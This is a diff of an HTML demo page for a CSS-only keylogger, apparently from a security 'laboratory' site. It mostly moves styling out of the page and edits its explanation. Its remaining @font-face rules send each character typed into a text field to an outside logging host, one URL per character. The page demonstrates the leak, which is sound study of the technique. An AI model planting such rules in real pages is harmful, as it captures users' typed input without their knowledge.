@@ -4,6 +4,7 @@
   <meta charset="UTF-8">
   <title>CSS Keylogger » HTML Laboratory » attac.us</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="css-keylogger.css">
   <style>
     @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%21"); unicode-range: U+21; }
     @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%22"); unicode-range: U+22; }
@@ -103,125 +104,6 @@
     input[type=text] {
       font-family: -spy;
     }
-
-    /********/
-
-    body,
-    input {
-      font: 700 20px/32px "Lucida Grande", "Lucida Sans Unicode", "Lucida Sans", Ubuntu, Tahoma, sans-serif;
-    }
-
-    html {
-      background: url(../images/purple-tile.gif) fixed #9B1A46;
-    }
-
-    body {
-      background: url(../images/tile.gif) #9ac4c9;
-
-      border-width: 3vw 1vw;
-      border-color: #f5c71a;
-      border-style: solid;
-    }
-
-
-    @media (min-width: 600px) {
-      body,
-      input {
-        font-size: 26px;
-        line-height: 40px;
-      }
-    }
-
-    body {
-      margin: auto;
-      padding: 0 2vw;
-
-      max-width: 600px;
-    }
-
-    h1,
-    h2,
-    input[type=submit] {
-      line-height: 1.2;
-
-      background: #CD3423;
-      color: white;
-    }
-
-    label {
-      background-image: linear-gradient(0,#CD3423 0,#CD3423 4px,rgba(0,0,0,0) 4px);
-    }
-
-    input[type=text] {
-      border: 4px solid #CD3423;
-
-      box-sizing: border-box;
-
-      display: block;
-      width: 100%;
-
-      margin: 0.5em 0;
-      padding: 0.0625em 0.25em;
-    }
-
-    input[type=submit] {
-      line-height: 1.6;
-
-      border: 0;
-      padding: 0.0625em 0.125em;
-
-      text-decoration: underline;
-    }
-
-    h1,
-    h2,
-    code {
-      font-family: "Lucida Console", Monaco, Consolas, "Fira Mono", "DejaVu Sans Mono", monospace;
-    }
-
-    h1 {
-      color: white;
-
-      margin: 0;
-      padding: 0.25em 0;
-
-      width: calc(100% + 4vw);
-
-      position: relative;
-      right: 2vw;
-
-      text-align: center;
-    }
-
-    p {
-      margin-top: 0;
-    }
-
-    a:link,
-    a:visited {
-      color: white;
-      background: #680068;
-
-      padding: 0.0625em 0.125em;
-      line-height: 0;
-    }
-
-    h2 {
-      padding: 0.25em;
-    }
-
-
-    figure { text-align: center; margin: 2em auto; width: 75%; max-width: 400px; }
-    figure img { width: 100%; height: auto; }
-
-    ul {
-      line-height: 2;
-    }
-
-    nav {
-      margin-top: 2em;
-    }
-
   </style>
 </head>
 <body>
@@ -238,14 +120,12 @@
 
   <p>
     This is another demo of a CSS-based keylogger based on <a href="https://news.ycombinator.com/item?id=16427394">this comment</a>.
-    There is no JavaScript on this page,
-    but it leaks user input through the <code>@font-face</code> CSS directive.
+    There is no JavaScript on this page — check the source!
+    The page tries to leak user input through the <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/@font-face"><code>@font-face</code></a> CSS rule.
   </p>
 
   <section>
     <h2>Try out the demo</h2>
-
-    <p>I “promise” not to share your information with third parties.</p>
 
     <figure class="thanks">
       <img alt="Please don’t enter sensitive information on my page thanks" src="../images/sensitive.svg" width="300" height="300">
